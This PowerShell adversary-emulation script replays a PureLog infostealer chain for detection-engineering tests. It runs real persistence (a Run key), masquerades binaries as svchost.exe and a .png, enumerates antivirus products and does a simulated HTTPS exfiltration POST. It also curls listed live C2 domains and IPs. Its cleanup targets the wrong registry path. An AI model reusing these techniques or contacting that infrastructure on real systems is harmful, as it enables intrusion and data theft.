# PureLog Stealer - Windows VM Attack Chain Simulation
# ======================================================
# Purpose : Detection engineering / hunt query validation
# Platform: Windows 10/11 VM with MDE -> Defender XDR / Sentinel
#
# Every action is BENIGN. No malware logic. No real C2 connections.
# Each stage produces real Windows telemetry matching PureLog TTPs.
#
# Usage:
#   Set-ExecutionPolicy Bypass -Scope Process -Force
#   .\simulate.ps1
#
# Single stage only:
#   .\simulate.ps1 -Stage 8

param(
    [int]$Stage    = 0,
    [int]$Delay    = 3,
    [switch]$NoCleanup
)

# ---------------------------------------------------------------------------
# PATHS
# ---------------------------------------------------------------------------
$StagingDir   = "C:\Users\Public\Windows"
$DllDir       = "$StagingDir\DLLs"
$DownloadsDir = "$env:USERPROFILE\Downloads\Notice_of_Alleged_Violation_of_IP_Rights_1770380091603"
$LureExe      = "$DownloadsDir\Notice of Alleged Violation of Intellectual Property Rights.exe"
$DecoyPdf     = "$StagingDir\document.pdf"
$Invoice      = "$StagingDir\invoice.pdf"
$Loader       = "$StagingDir\instructions.pdf"
$FakeSvchost  = "$StagingDir\svchost.exe"
$FakeWinrar   = "$StagingDir\FILE_2025_Employment_Certificate_Original.png"
$SimKey       = "efvBE97W7Ke4RnZaDTXOJzgqa04EPfz9"

# ---------------------------------------------------------------------------
# HELPERS
# ---------------------------------------------------------------------------
function Write-Stage($n, $title, $mitre) {
    Write-Host ""
    Write-Host ("[{0}] STAGE {1:D2} - {2}" -f (Get-Date -Format "HH:mm:ss"), $n, $title) -ForegroundColor Cyan
    Write-Host ("         MITRE : {0}" -f $mitre) -ForegroundColor DarkCyan
}
function Write-Ok($msg)   { Write-Host "  [OK]  $msg" -ForegroundColor Green }
function Write-Act($msg)  { Write-Host "  [>>]  $msg" -ForegroundColor Yellow }
function Write-Warn($msg) { Write-Host "  [!!]  $msg" -ForegroundColor Magenta }

function Run-Process($exe, $argList) {
    Write-Act "exec: $exe $argList"
    try {
        Start-Process -FilePath $exe -ArgumentList $argList -Wait -WindowStyle Hidden -ErrorAction SilentlyContinue
    } catch {
        Write-Warn "Process error: $_"
    }
}

# ---------------------------------------------------------------------------
# SETUP
# ---------------------------------------------------------------------------
function Setup-Environment {
    Write-Act "Creating staging directory structure"

    foreach ($dir in @($StagingDir, $DllDir, $DownloadsDir)) {
        if (-not (Test-Path $dir)) {
            New-Item -ItemType Directory -Path $dir -Force | Out-Null
        }
    }

    # Kill any lingering cmd processes from a previous run that may be locking files
    Get-Process -Name "cmd" -ErrorAction SilentlyContinue |
        Where-Object { $_.MainWindowTitle -eq "" } |
        Stop-Process -Force -ErrorAction SilentlyContinue
    Start-Sleep -Milliseconds 500

    # Write placeholder files - wrapped in try/catch so a locked file does not abort setup
    try { Set-Content -Path $LureExe  -Value "@echo off`r`nexit 0"         -Encoding ASCII -Force } catch { Write-Warn "Skipping locked: $LureExe" }
    try { Set-Content -Path $DecoyPdf -Value "%PDF-1.4 SIMULATION DECOY"   -Encoding ASCII -Force } catch { Write-Warn "Skipping locked: $DecoyPdf" }
    try { Set-Content -Path $Loader   -Value "# SIMULATION LOADER"          -Encoding ASCII -Force } catch { Write-Warn "Skipping locked: $Loader" }

    # Benign archive saved as invoice.pdf
    try {
        $tempTxt = "$env:TEMP\payload_sim.txt"
        Set-Content -Path $tempTxt -Value "SIMULATION PAYLOAD" -Encoding ASCII
        if (Test-Path "$Invoice.zip") { Remove-Item "$Invoice.zip" -Force -ErrorAction SilentlyContinue }
        if (Test-Path $Invoice)       { Remove-Item $Invoice       -Force -ErrorAction SilentlyContinue }
        Compress-Archive -Path $tempTxt -DestinationPath "$Invoice.zip" -Force
        Move-Item -Path "$Invoice.zip" -Destination $Invoice -Force
        Remove-Item $tempTxt -Force -ErrorAction SilentlyContinue
    } catch { Write-Warn "invoice.pdf creation skipped: $_" }

    # Python DLL/PYD stubs (MZ header bytes)
    $mzStub = [byte[]](0x4D, 0x5A) + ([byte[]](0x00) * 62)
    $artifacts = @(
        "$StagingDir\python314.dll",
        "$DllDir\_ctypes.pyd",    "$DllDir\libffi-8.dll",
        "$DllDir\_hashlib.pyd",   "$DllDir\libcrypto-3.dll",
        "$DllDir\_socket.pyd",    "$DllDir\_ssl.pyd",
        "$DllDir\libssl-3.dll",   "$DllDir\_bz2.pyd",
        "$DllDir\_lzma.pyd",      "$DllDir\_zstd.pyd"
    )
    foreach ($f in $artifacts) {
        try { [System.IO.File]::WriteAllBytes($f, $mzStub) } catch {}
    }

    # Renamed cmd.exe -> svchost.exe
    Copy-Item "$env:SystemRoot\System32\cmd.exe" $FakeSvchost -Force -ErrorAction SilentlyContinue

    # Renamed where.exe -> FILE_*.png
    # where.exe is guaranteed 32-bit on all Windows versions, exits immediately with any arg
    Copy-Item "$env:SystemRoot\System32\where.exe" $FakeWinrar -Force -ErrorAction SilentlyContinue

    Write-Ok "Environment ready"
}

# ---------------------------------------------------------------------------
# STAGE 1 - Hunt 4
# Lure EXE execution from Downloads
# T1204.002
# ---------------------------------------------------------------------------
function Stage-1 {
    Write-Stage 1 "Copyright Lure EXE Execution from Downloads" "T1204.002"
    # Run directly so MDE sees FileName=lure.exe and FolderPath=Downloads in DeviceProcessEvents
    Write-Act "Executing lure directly: $LureExe"
    try {
        $proc = Start-Process -FilePath $LureExe -Wait -WindowStyle Hidden -PassThru -ErrorAction Stop
    } catch {
        # Fallback: copy to a .bat extension which Windows will execute directly
        $lureBat = "$DownloadsDir\Notice of Alleged Violation of Intellectual Property Rights - Copy.bat"
        Copy-Item $LureExe $lureBat -Force
        Start-Process -FilePath $lureBat -Wait -WindowStyle Hidden -ErrorAction SilentlyContinue
    }
    Write-Ok "Fires: Hunt 4 (lure name pattern + Downloads path)"
}

# ---------------------------------------------------------------------------
# STAGE 2 - Decoy PDF open
# T1036.001
# ---------------------------------------------------------------------------
function Stage-2 {
    Write-Stage 2 "Decoy PDF Opened" "T1036.001"
    # Use cmd /c type instead of start - avoids blocking on PDF viewer launch
    Run-Process "cmd.exe" "/c type `"$DecoyPdf`""
    Write-Ok "Decoy open event generated"
}

# ---------------------------------------------------------------------------
# STAGE 3 - Hunt 5
# curl with meow_meow User-Agent + /DQ endpoint
# T1105 / T1071.001
# ---------------------------------------------------------------------------
function Stage-3 {
    Write-Stage 3 "curl Download - meow_meow User-Agent" "T1105 / T1071.001"
    Run-Process "curl.exe" "-A curl/meow_meow -s -k -L https://httpbin.org/get -o `"$Invoice`" --max-time 10"
    Run-Process "curl.exe" "-A curl/meow_meow -s -k -L https://httpbin.org/get?DQ=sim -o `"$env:TEMP\DQ_sim.tmp`" --max-time 10"
    Write-Ok "Fires: Hunt 5 (meow_meow + -A -s -k -L + DQ pattern)"
}

# ---------------------------------------------------------------------------
# STAGE 4 - Hunt 5
# Remote key retrieval /DQ/key
# T1568
# ---------------------------------------------------------------------------
function Stage-4 {
    Write-Stage 4 "Remote Key Retrieval - /DQ/key" "T1568"
    Run-Process "curl.exe" "-A curl/meow_meow -s -k -L https://httpbin.org/get?DQ=key --max-time 10"
    Write-Ok "Fires: Hunt 5 (DQ + key in CommandLine)"
}

# ---------------------------------------------------------------------------
# STAGE 5 - Hunt 6
# Renamed WinRAR PNG extension - archive extraction flags
# T1036.005 / T1140
# ---------------------------------------------------------------------------
function Stage-5 {
    Write-Stage 5 "Renamed WinRAR PNG Extension - Archive Extraction" "T1036.005 / T1140"
    # Start-Process on the PNG binary directly - MDE records FileName=FILE_*.png
    # Pass "x" and "-p" as arguments so ProcessCommandLine contains both strings
    Write-Act "Executing renamed binary: $($FakeWinrar | Split-Path -Leaf) x -p<key>"
    try {
        Start-Process -FilePath $FakeWinrar -ArgumentList "x -p$SimKey" -Wait -WindowStyle Hidden -ErrorAction SilentlyContinue
    } catch {
        Write-Warn "Direct exec failed, trying via cmd with explicit path"
        Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"`"$FakeWinrar`"` x -p$SimKey`"" -Wait -WindowStyle Hidden -ErrorAction SilentlyContinue
    }
    Write-Ok "Fires: Hunt 6 (FileName endswith .png + CommandLine has x and -p)"
}

# ---------------------------------------------------------------------------
# STAGE 6 - Anti-forensics file deletion
# T1070.004
# ---------------------------------------------------------------------------
function Stage-6 {
    Write-Stage 6 "Staging File Deletion - invoice.pdf" "T1070.004"
    if (Test-Path $Invoice) {
        Remove-Item $Invoice -Force
        Write-Ok "FileDelete event generated"
    } else {
        Write-Warn "invoice.pdf not present, skipping"
    }
}

# ---------------------------------------------------------------------------
# STAGE 7 - Hunt 7
# svchost.exe in non-standard path running instructions.pdf
# T1036.003 / T1059.006
# ---------------------------------------------------------------------------
function Stage-7 {
    Write-Stage 7 "Renamed svchost.exe in Public Path - Running instructions.pdf" "T1036.003 / T1059.006"
    Run-Process $FakeSvchost "/c type `"$Loader`""
    Write-Ok "Fires: Hunt 7 (svchost.exe not in System32 + instructions.pdf in CommandLine)"
}

# ---------------------------------------------------------------------------
# STAGE 8 - Hunt 8
# Python DLL/PYD files in C:\Users\Public\Windows
# T1564.001
# ---------------------------------------------------------------------------
function Stage-8 {
    Write-Stage 8 "Python DLL/PYD Artifacts in Fake Windows Directory" "T1564.001"
    $mzStub = [byte[]](0x4D, 0x5A) + ([byte[]](0x00) * 62)
    $files = @(
        "$StagingDir\python314.dll", "$DllDir\_ctypes.pyd",
        "$DllDir\libffi-8.dll",      "$DllDir\_hashlib.pyd",
        "$DllDir\_ssl.pyd",          "$DllDir\libssl-3.dll",
        "$DllDir\_bz2.pyd",          "$DllDir\_lzma.pyd"
    )
    foreach ($f in $files) {
        [System.IO.File]::WriteAllBytes($f, $mzStub)
    }
    Write-Ok "Fires: Hunt 8 (C:\Users\Public\Windows + .dll/.pyd files)"
}

# ---------------------------------------------------------------------------
# STAGE 9 - Hunt 9
# Registry persistence - SystemSettings Run key
# T1547.001
# ---------------------------------------------------------------------------
function Stage-9 {
    Write-Stage 9 "Registry Persistence - SystemSettings Run Key" "T1547.001"
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $valData = "`"$FakeSvchost`" `"$Loader`""
    try {
        Set-ItemProperty -Path $regPath -Name "SystemSettings" -Value $valData -Type String -Force
        Write-Ok "SystemSettings Run key written"
    } catch {
        Write-Warn "Registry write failed: $_"
    }
    Write-Ok "Fires: Hunt 9 (HKCU Run + SystemSettings + Public\Windows path)"
}

# ---------------------------------------------------------------------------
# STAGE 10 - Hunt 10
# PowerShell WMI SecurityCenter2 AV enumeration
# T1518.001
# ---------------------------------------------------------------------------
function Stage-10 {
    Write-Stage 10 "AV Enumeration - PowerShell WMI SecurityCenter2" "T1518.001"
    $psArgs = "-NoProfile -WindowStyle Hidden -Command `"Get-WmiObject -Namespace root/SecurityCenter2 -Class AntivirusProduct | ForEach-Object { `$_.displayName }`""
    Run-Process "powershell.exe" $psArgs
    Write-Ok "Fires: Hunt 10 (powershell + SecurityCenter2 + AntivirusProduct + NoProfile + WindowStyle Hidden)"
}

# ---------------------------------------------------------------------------
# STAGE 11 - Hunt 13
# Kill chain correlation - all 4 stages in time window
# ---------------------------------------------------------------------------
function Stage-11 {
    Write-Stage 11 "Kill Chain Correlation - All 4 Stages in Time Window" "Full chain"
    Run-Process "cmd.exe" "/c `"$LureExe`""
    Start-Sleep -Seconds 1
    Run-Process "curl.exe" "-A curl/meow_meow -s -k -L https://httpbin.org/get?DQ=chain -o `"$env:TEMP\chain_sim.tmp`" --max-time 10"
    Start-Sleep -Seconds 1
    Run-Process $FakeSvchost "/c echo chain_sim"
    Start-Sleep -Seconds 1
    Run-Process "powershell.exe" "-NoProfile -WindowStyle Hidden -Command `"Get-WmiObject -Namespace root/SecurityCenter2 -Class AntivirusProduct | ForEach-Object { `$_.displayName }`""
    Write-Ok "Fires: Hunt 13 (lure + curl + svchost_masq + av_enum join within window)"
}

# ---------------------------------------------------------------------------
# STAGE 12 - Hunt 14
# CacheVersion=1337 registry marker
# T1112
# ---------------------------------------------------------------------------
function Stage-12 {
    Write-Stage 12 "CacheVersion=1337 Registry Marker" "T1112"
    # Write to the exact key from the campaign report
    # Hunt 14 uses: RegistryKey has "AppModel\\StateRepository" - so the key path must contain this string
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\AppModel\StateRepository"
    Write-Act "Writing CacheVersion=1337 to $regPath"
    try {
        if (-not (Test-Path $regPath)) {
            New-Item -Path $regPath -Force | Out-Null
        }
        Set-ItemProperty -Path $regPath -Name "CacheVersion" -Value 1337 -Type DWord -Force
        Write-Ok "CacheVersion=1337 written at $regPath"
    } catch {
        Write-Warn "Set-ItemProperty failed: $_ - trying reg.exe"
        Run-Process "reg.exe" "add `"HKCU\Software\Microsoft\Windows\CurrentVersion\AppModel\StateRepository`" /v CacheVersion /t REG_DWORD /d 1337 /f"
    }
    Write-Ok "Fires: Hunt 14 (AppModel\StateRepository + CacheVersion + 1337)"
}

# ---------------------------------------------------------------------------
# STAGE 13 - Hunt 15
# HTTPS POST from svchost.exe in Public path
# T1041
# ---------------------------------------------------------------------------
function Stage-13 {
    Write-Stage 13 "C2 Exfiltration - HTTPS POST from svchost.exe in Public Path" "T1041"
    # Write a tiny PS1 helper into the staging dir, then run it via FakeSvchost (cmd.exe)
    # This makes MDE record: InitiatingProcessFileName=svchost.exe from C:\Users\Public\Windows
    # AND the network connection from that same process
    $helperScript = "$StagingDir\exfil_sim.ps1"
    Set-Content -Path $helperScript -Value 'try { Invoke-WebRequest -Uri "https://httpbin.org/post" -Method POST -Body "{"sim":true}" -ContentType "application/json" -UseBasicParsing -TimeoutSec 10 | Out-Null } catch {}' -Encoding ASCII
    Write-Act "Running HTTPS exfil from $($FakeSvchost | Split-Path -Leaf) in Public path"
    Run-Process $FakeSvchost "/c powershell.exe -NoProfile -WindowStyle Hidden -File `"$helperScript`""
    Remove-Item $helperScript -Force -ErrorAction SilentlyContinue
    Write-Ok "Fires: Hunt 15 (svchost.exe InitiatingProcess + Public path + port 443)"
}

# ---------------------------------------------------------------------------
# STAGE 14 - Hunt 12
# Chrome with --no-sandbox flags from non-browser parent
# T1555.003
# ---------------------------------------------------------------------------
function Stage-14 {
    Write-Stage 14 "Chrome --no-sandbox Flags from Non-Browser Parent" "T1555.003"
    $chrome  = "$env:ProgramFiles\Google\Chrome\Application\chrome.exe"
    $chromex = "${env:ProgramFiles(x86)}\Google\Chrome\Application\chrome.exe"
    $chromePath = $null
    if (Test-Path $chrome)  { $chromePath = $chrome }
    elseif (Test-Path $chromex) { $chromePath = $chromex }

    if ($chromePath) {
        $tempProfile = "$env:TEMP\qs4hg1fa.prl"
        if (-not (Test-Path $tempProfile)) {
            New-Item -ItemType Directory -Path $tempProfile -Force | Out-Null
        }
        Write-Act "Launching Chrome with --no-sandbox --extension-process flags"
        $chromeArgs = "--type=renderer --user-data-dir=`"$tempProfile`" --extension-process --no-sandbox --disable-gpu-compositing"
        $proc = Start-Process -FilePath $chromePath -ArgumentList $chromeArgs -PassThru -WindowStyle Hidden -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 3
        if ($proc) { Stop-Process -Id $proc.Id -Force -ErrorAction SilentlyContinue }
        Write-Ok "Fires: Hunt 12 (chrome.exe + no-sandbox + user-data-dir Temp + extension-process)"
    } else {
        Write-Warn "Chrome not found - skipping (install Chrome for Hunt 12 to fire)"
    }
}

# ---------------------------------------------------------------------------
# STAGE 15 - Hunts 1 / 2 / 3
# IoC telemetry - DNS queries + C2 IP connections
# ---------------------------------------------------------------------------
function Stage-15 {
    Write-Stage 15 "IoC Telemetry - DNS Queries and C2 IP Connections" "T1071.001 / T1568"

    # IoC hash reference files
    Set-Content "$StagingDir\ioc_35efc4b7.txt" "SHA256:35efc4b75a1d70c38513b4dfe549da417aaa476bf7e9ebd00265aaa8c7295870" -Encoding ASCII
    Set-Content "$StagingDir\ioc_1539dab6.txt" "SHA256:1539dab6099d860add8330bf2a008a4b6dc05c71f7b4439aebf431e034e5b6ff" -Encoding ASCII
    Set-Content "$StagingDir\ioc_ac591ade.txt" "SHA256:ac591adea9a2305f9be6ae430996afd9b7432116f381b638014a0886a99c6287" -Encoding ASCII

    # DNS queries - will NXDOMAIN but query event still generated
    $domains = @("quickdocshare.com", "bestshopingday.com", "bestsaleshoppingday.com")
    foreach ($d in $domains) {
        Write-Act "DNS query: $d"
        Run-Process "curl.exe" "-s -k --max-time 3 https://$d"
        Start-Sleep -Milliseconds 500
    }

    # C2 IP connection attempts - will be refused but NetworkConnect event generated
    $ips = @("166.0.184.127", "64.40.154.96")
    foreach ($ip in $ips) {
        Write-Act "Connect attempt: $ip :443"
        Run-Process "curl.exe" "-s -k --max-time 3 https://$ip"
        Start-Sleep -Milliseconds 500
    }

    Write-Ok "Fires: Hunt 1 (hashes), Hunt 2 (domains/IPs), Hunt 3 (DNS)"
}

# ---------------------------------------------------------------------------
# CLEANUP
# ---------------------------------------------------------------------------
function Cleanup {
    Write-Host ""
    Write-Host "[CLEANUP] Removing simulation artifacts" -ForegroundColor Yellow

    foreach ($p in @("C:\Users\Public\Windows", $DownloadsDir, "$env:TEMP\qs4hg1fa.prl")) {
        if (Test-Path $p) {
            Remove-Item $p -Recurse -Force -ErrorAction SilentlyContinue
            Write-Ok "Removed: $p"
        }
    }
    Remove-Item "$env:TEMP\DQ_sim.tmp"    -Force -ErrorAction SilentlyContinue
    Remove-Item "$env:TEMP\chain_sim.tmp" -Force -ErrorAction SilentlyContinue

    try {
        Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
            -Name "SystemSettings" -ErrorAction SilentlyContinue
        Write-Ok "Removed SystemSettings Run key"
    } catch {}
    try {
        $srPath = "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\CurrentVersion\AppModel\StateRepository"
        Remove-ItemProperty -Path $srPath -Name "CacheVersion" -ErrorAction SilentlyContinue
        Write-Ok "Removed CacheVersion key"
    } catch {}

    Write-Ok "Cleanup complete"
}

# ---------------------------------------------------------------------------
# SUMMARY
# ---------------------------------------------------------------------------
function Show-Summary($elapsed) {
    Write-Host ""
    Write-Host "================================================================" -ForegroundColor Cyan
    Write-Host "  SIMULATION COMPLETE" -ForegroundColor Cyan
    Write-Host "================================================================" -ForegroundColor Cyan
    Write-Host ("  Total time : {0:F1}s" -f $elapsed)
    Write-Host "  Log tables : DeviceProcessEvents, DeviceFileEvents,"
    Write-Host "               DeviceNetworkEvents, DeviceRegistryEvents"
    Write-Host ""
    Write-Host "  Quick verify (Defender XDR Advanced Hunting):" -ForegroundColor White
    Write-Host ""
    Write-Host "  DeviceProcessEvents"                                                              -ForegroundColor DarkCyan
    Write-Host "  | where Timestamp > ago(2h)"                                                     -ForegroundColor DarkCyan
    Write-Host "  | where FolderPath startswith @'C:\Users\Public\Windows'"                        -ForegroundColor DarkCyan
    Write-Host "      or (FileName =~ 'svchost.exe'"                                               -ForegroundColor DarkCyan
    Write-Host "          and not FolderPath startswith @'C:\Windows')"                            -ForegroundColor DarkCyan
    Write-Host "      or ProcessCommandLine has 'meow_meow'"                                       -ForegroundColor DarkCyan
    Write-Host "      or ProcessCommandLine has 'instructions.pdf'"                                -ForegroundColor DarkCyan
    Write-Host "  | project Timestamp, DeviceName, FileName, FolderPath, ProcessCommandLine"      -ForegroundColor DarkCyan
    Write-Host "  | sort by Timestamp desc"                                                        -ForegroundColor DarkCyan
    Write-Host ""
    Write-Host "  Wait 5-10 min for MDE to ship events, then run all 15 hunts." -ForegroundColor Green
    Write-Host "================================================================" -ForegroundColor Cyan
}

# ---------------------------------------------------------------------------
# MAIN
# ---------------------------------------------------------------------------
Write-Host ""
Write-Host "================================================================" -ForegroundColor Cyan
Write-Host "  PureLog Stealer - Windows VM Attack Chain Simulation"          -ForegroundColor Cyan
Write-Host "  Campaign : Copyright Lure / Multi-Stage Infostealer"           -ForegroundColor Cyan
Write-Host "  Platform : Windows 10/11 + MDE -> Defender XDR / Sentinel"    -ForegroundColor Cyan
Write-Host "================================================================" -ForegroundColor Cyan
Write-Host ""

Setup-Environment

$allStages = @(
    { Stage-1  }, { Stage-2  }, { Stage-3  }, { Stage-4  }, { Stage-5  },
    { Stage-6  }, { Stage-7  }, { Stage-8  }, { Stage-9  }, { Stage-10 },
    { Stage-11 }, { Stage-12 }, { Stage-13 }, { Stage-14 }, { Stage-15 }
)

$t0 = Get-Date

if ($Stage -gt 0) {
    if ($Stage -lt 1 -or $Stage -gt $allStages.Count) {
        Write-Host "Invalid stage. Use 1-$($allStages.Count)" -ForegroundColor Red
        exit 1
    }
    & $allStages[$Stage - 1]
} else {
    for ($i = 0; $i -lt $allStages.Count; $i++) {
        & $allStages[$i]
        if ($i -lt $allStages.Count - 1) {
            Write-Act "Waiting ${Delay}s..."
            Start-Sleep -Seconds $Delay
        }
    }
}

if (-not $NoCleanup) { Cleanup }
else { Write-Warn "-NoCleanup set: artifacts left on disk" }

Show-Summary ((Get-Date) - $t0).TotalSeconds
